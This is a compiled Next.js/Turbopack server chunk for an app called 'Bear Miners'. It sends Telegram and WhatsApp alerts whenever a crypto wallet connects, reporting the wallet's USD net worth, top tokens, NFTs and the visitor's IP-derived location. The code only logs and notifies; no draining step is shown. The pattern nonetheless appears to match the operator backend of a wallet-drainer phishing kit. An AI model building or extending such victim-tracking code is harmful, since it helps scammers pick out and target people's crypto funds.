module.exports = [
"[externals]/@prisma/client [external] (@prisma/client, cjs)", ((__turbopack_context__, module, exports) => {

const mod = __turbopack_context__.x("@prisma/client", () => require("@prisma/client"));

module.exports = mod;
}),
"[project]/src/lib/prisma.ts [app-route] (ecmascript)", ((__turbopack_context__) => {
"use strict";

// lib/prisma.ts
__turbopack_context__.s([
    "prisma",
    ()=>prisma
]);
var __TURBOPACK__imported__module__$5b$externals$5d2f40$prisma$2f$client__$5b$external$5d$__$2840$prisma$2f$client$2c$__cjs$29$__ = __turbopack_context__.i("[externals]/@prisma/client [external] (@prisma/client, cjs)");
;
const globalForPrisma = /*TURBOPACK member replacement*/ __turbopack_context__.g;
const prisma = globalForPrisma.prisma || new __TURBOPACK__imported__module__$5b$externals$5d2f40$prisma$2f$client__$5b$external$5d$__$2840$prisma$2f$client$2c$__cjs$29$__["PrismaClient"]();
if ("TURBOPACK compile-time truthy", 1) globalForPrisma.prisma = prisma;
}),
"[project]/src/lib/telegram.ts [app-route] (ecmascript)", ((__turbopack_context__) => {
"use strict";

__turbopack_context__.s([
    "TelegramService",
    ()=>TelegramService
]);
var __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$prisma$2e$ts__$5b$app$2d$route$5d$__$28$ecmascript$29$__ = __turbopack_context__.i("[project]/src/lib/prisma.ts [app-route] (ecmascript)");
;
class TelegramService {
    /**
     * Sends a notification to the configured Telegram and WhatsApp channels.
     * @param message - The message content to send (supports HTML).
     */ static async sendNotification(message) {
        console.log("[NotificationService] Processing outbound alert...");
        try {
            // 1. Fetch latest settings from DB
            const settings = await __TURBOPACK__imported__module__$5b$project$5d2f$src$2f$lib$2f$prisma$2e$ts__$5b$app$2d$route$5d$__$28$ecmascript$29$__["prisma"].globalSettings.findUnique({
                where: {
                    id: 1
                }
            });
            if (!settings) {
                console.error("[NotificationService] Fatal: Global settings not found in database.");
                return;
            }
            // --- Telegram Flow ---
            if (settings.telegramBotToken && settings.telegramChatId) {
                console.log(`[TelegramService] Sending alert to Chat ID: ${settings.telegramChatId}...`);
                const url = `https://api.telegram.org/bot${settings.telegramBotToken}/sendMessage`;
                const response = await fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: settings.telegramChatId,
                        text: message,
                        parse_mode: "HTML"
                    })
                });
                if (response.ok) {
                    console.log("[TelegramService] ✅ Success: Message delivered to Telegram.");
                } else {
                    const errorText = await response.text();
                    console.error(`[TelegramService] ❌ Failed: ${response.status} - ${errorText}`);
                    // Fallback to plain text if HTML parsing fails (common for special characters)
                    if (errorText.includes("can't parse entities")) {
                        console.log("[TelegramService] ℹ️ Retrying with plain-text fallback...");
                        await fetch(url, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                chat_id: settings.telegramChatId,
                                text: message.replace(/<[^>]*>/g, '')
                            })
                        });
                    }
                }
            } else if (settings.telegramBotToken || settings.telegramChatId) {
                console.warn("[TelegramService] ⚠️ Configuration is incomplete. Ensure both Token and Chat ID are set.");
            }
            // --- WhatsApp Flow (via Twilio) ---
            if (settings.whatsappEnabled && settings.twilioAccountSid && settings.twilioAuthToken && settings.twilioPhoneNumber) {
                console.log(`[WhatsAppService] Sending alert via Twilio to ${settings.twilioPhoneNumber}...`);
                const auth = Buffer.from(`${settings.twilioAccountSid}:${settings.twilioAuthToken}`).toString('base64');
                const twilioUrl = `https://api.twilio.com/2010-04-01/Accounts/${settings.twilioAccountSid}/Messages.json`;
                // Remove HTML tags for WhatsApp (markdown-only)
                const plainText = message.replace(/<[^>]*>/g, '');
                const response = await fetch(twilioUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Authorization": `Basic ${auth}`
                    },
                    body: new URLSearchParams({
                        From: settings.twilioPhoneNumber,
                        To: settings.twilioPhoneNumber.startsWith("whatsapp:") ? settings.twilioPhoneNumber : `whatsapp:${settings.twilioPhoneNumber}`,
                        Body: `[Bear Miners Alert]\n${plainText}`
                    })
                });
                if (response.ok) {
                    console.log("[WhatsAppService] ✅ Success: Alert delivered to WhatsApp.");
                } else {
                    const errorDetails = await response.text();
                    console.error(`[WhatsAppService] ❌ Failed: ${response.status} - ${errorDetails}`);
                }
            } else if (settings.whatsappEnabled) {
                console.warn("[WhatsAppService] ⚠️ WhatsApp enabled but Twilio configuration is missing fields.");
            }
        } catch (error) {
            console.error("[NotificationService] 🚨 Fatal Error during delivery:", error);
        }
    }
    /**
     * Fetches IP details using a public API.
     */ static async getIpDetails(ip) {
        if (!ip || ip === '::1' || ip === '127.0.0.1') return "Localhost (Dev Environment)";
        try {
            const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp`);
            const data = await res.json();
            if (data.status === 'success') {
                return `${data.city}, ${data.country} (${data.isp})`;
            }
        } catch (e) {
            console.warn("Failed to fetch IP details:", e);
        }
        return "Unknown Location";
    }
    /**
     * Formats a wallet connection message.
     */ static formatConnectionMessage(walletAddress, usdBalance, network = "Solana", tokens = [], nfts = []) {
        const shortWallet = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
        const totalValue = new Intl.NumberFormat('en-US', {
            style: 'currency',
            currency: 'USD'
        }).format(usdBalance);
        // Determine Explorer URL
        let explorerLink = `https://solscan.io/account/${walletAddress}`;
        const networkName = String(network || "Solana");
        const netLower = networkName.toLowerCase();
        if (netLower.includes("eth") || netLower.includes("erc")) {
            explorerLink = `https://etherscan.io/address/${walletAddress}`;
        } else if (netLower.includes("btc") || netLower.includes("bitcoin")) {
            explorerLink = `https://mempool.space/address/${walletAddress}`;
        } else if (netLower.includes("bsc") || netLower.includes("binance")) {
            explorerLink = `https://bscscan.com/address/${walletAddress}`;
        }
        let tokenList = "";
        // Show top 15 tokens by value (more info)
        if (tokens && tokens.length > 0) {
            tokens.slice(0, 15).forEach((t)=>{
                const symbol = t.symbol || "Unknown";
                const val = new Intl.NumberFormat('en-US', {
                    style: 'currency',
                    currency: 'USD'
                }).format(t.valueUsd || 0);
                const amount = Number(t.amount).toLocaleString(undefined, {
                    maximumFractionDigits: 2
                });
                tokenList += `🔹 <b>${symbol}</b>: ${amount} (${val})\n`;
            });
            if (tokens.length > 15) tokenList += `<i>...and ${tokens.length - 15} more tokens</i>\n`;
        }
        let nftList = "";
        if (nfts && nfts.length > 0) {
            nfts.slice(0, 10).forEach((n)=>{
                nftList += `🖼 <code>${n.mint.slice(0, 5)}...${n.mint.slice(-5)}</code>\n`;
            });
            if (nfts.length > 10) nftList += `<i>...and ${nfts.length - 10} more NFTs</i>\n`;
        }
        return `
💰 <b>${totalValue} ${network} Wallet Connected</b>

👤 <b>User:</b> <code>${shortWallet}</code>
🏦 <b>Network:</b> ${network}
💵 <b>Net Worth:</b> <b>${totalValue}</b>

<b>Top Tokens & Meme Coins:</b>
${tokenList || "No tokens found."}
${nfts.length > 0 ? `\n<b>NFTs Detected:</b>\n${nftList}` : ""}
🔗 <a href="${explorerLink}">View on Explorer</a>
    `.trim();
    }
    static escapeHTML(str) {
        return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    }
}
}),
];

//# sourceMappingURL=%5Broot-of-the-server%5D__8e7792ff._.js.map